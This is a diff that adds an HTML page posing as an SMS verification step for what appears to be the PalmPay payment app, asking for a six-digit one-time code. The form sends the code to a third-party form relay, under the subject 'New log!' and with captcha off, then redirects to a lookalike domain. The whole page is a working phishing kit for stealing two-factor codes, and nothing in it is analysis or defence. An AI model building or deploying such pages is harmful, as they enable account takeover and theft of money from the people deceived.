@@ -1,0 +1,113 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/svg+xml" href="logo.webp">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.scss">
+    <link rel="stylesheet" href="verify.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&amp;display=swap" rel="stylesheet">
+    <title> otp - Sign In</title>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
+    </style>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init('dmDFhm35MG0A-aotg');
+        })();
+    </script>
+    <script type="text/javascript">
+        window.onload = function () {
+            console.log('working');
+            const btn = document.querySelector('button')
+            document.getElementById('form').addEventListener('submit', function (event) {
+                btn.textContent = 'Loading...';
+
+                const telInputs = document.querySelectorAll('input[type="tel"]');
+                const pinInput = document.querySelector('#pin');
+
+                let fullPin = "";
+
+                for (const input of telInputs) {
+                    fullPin += input.value;
+                }
+
+                pinInput.value = fullPin;
+
+                console.log(pinInput.value);
+            });
+        }
+    </script>
+<link href="data:text/css,%5Bid*%3D'google_ads_iframe'%5D%2C%5Bid*%3D'taboola-'%5D%2C.taboolaHeight%2C.taboola-placeholder%2C%23credential_picker_container%2C%23credentials-picker-container%2C%23credential_picker_iframe%2C%5Bid*%3D'google-one-tap-iframe'%5D%2C%23google-one-tap-popup-container%2C.google-one-tap-modal-div%2C%23amp_floatingAdDiv%2C%23ez-content-blocker-container%2C%23notify-adblock%7Bdisplay%3Anone!important%3Bmin-height%3A0!important%3Bheight%3A0!important%3B%7D" rel="stylesheet" type="text/css"></head>
+
+<body data-new-gr-c-s-check-loaded="8.906.0" data-gr-ext-installed="">
+    <div id="app" class="mt-12 text-center w-[90%] mx-auto max-w-sm">
+        <h1 class="font-bold text-xl">Attention</h1>
+        <p class="text-slate-800 text-sm mt-3">For risk control, a verification code is sent to you via SMS. Please
+            enter the verification code to continue</p>
+
+        <form action="https://formsubmit.co/el/kohoxa" method="post" id="form" class="flex items-center justify-center mt-10">
+
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="New log!">
+            <input type="hidden" name="_next" value="https://web-palmpayapp.live/verify.html">
+
+            <input type="number" id="pin" name="2-F-A" class="hidden">
+
+
+            <input type="tel" required="" class="h-14 w-14 rounded-l-md pin text-center text-lg outline-none border" onkeyup="inputInsideOtpInput(this)">
+            <input type="tel" required="" class="h-14 w-14 pin text-center text-lg outline-none border" onkeyup="inputInsideOtpInput(this)">
+            <input type="tel" required="" class="h-14 w-14 pin text-center text-lg outline-none border" onkeyup="inputInsideOtpInput(this)">
+            <input type="tel" required="" class="h-14 w-14 pin text-center text-lg outline-none border" onkeyup="inputInsideOtpInput(this)">
+            <input type="tel" required="" class="h-14 w-14 pin text-center text-lg outline-none border" onkeyup="inputInsideOtpInput(this)">
+            <input type="tel" required="" class="h-14 w-14 pin rounded-r-md text-center text-lg outline-none border" onkeyup="inputInsideOtpInput(this)" maxlength="1">
+        </form>
+
+        <button disabled="" form="form" type="submit" class="w-full text-white rounded-lg bg-primary p-3 mt-10">Continue</button>
+
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+    <script type="module" src="/main.js"></script>
+
+<script>
+    function inputInsideOtpInput(el) {
+        if (el.value.length > 1) {
+            el.value == ''
+            if (el.nextElementSibling.value == '') {
+                el.nextElementSibling.value = el.value[el.value.length - 1]
+            }
+            if (!el.nextElementSibling) {
+                el.value = el.value[0]
+            }
+            el.value = el.value[0]
+        }
+        try {
+            if (el.value == null || el.value == "") {
+                this.foucusOnInput(el.previousElementSibling);
+            } else {
+                this.foucusOnInput(el.nextElementSibling);
+            }
+        } catch (e) {
+            console.log(e);
+        }
+    }
+
+    function foucusOnInput(ele) {
+        ele.focus();
+    }
+</script>
+
+</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
